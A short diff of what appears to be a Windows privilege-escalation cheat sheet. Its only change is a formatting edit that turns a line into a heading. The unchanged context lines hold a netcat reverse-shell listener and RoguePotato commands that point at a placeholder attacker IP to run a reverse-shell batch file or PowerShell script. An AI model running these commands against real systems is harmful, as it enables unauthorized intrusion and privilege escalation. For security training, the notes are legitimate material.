@@ -46,7 +46,7 @@ nc -nvlp 1234
 .\RoguePotato.exe -r 10.10.x.x -l 9999 -e c:\\Windows\\Temp\\rev.bat
 ```
 
-if you're using Powershell.
+#### If you're using Powershell.
 ```markdown
 .\RoguePotato.exe -r 10.10.x.x -l 9999 -e "powershell c:\\Windows\\Temp\\shell.ps1"
 ```
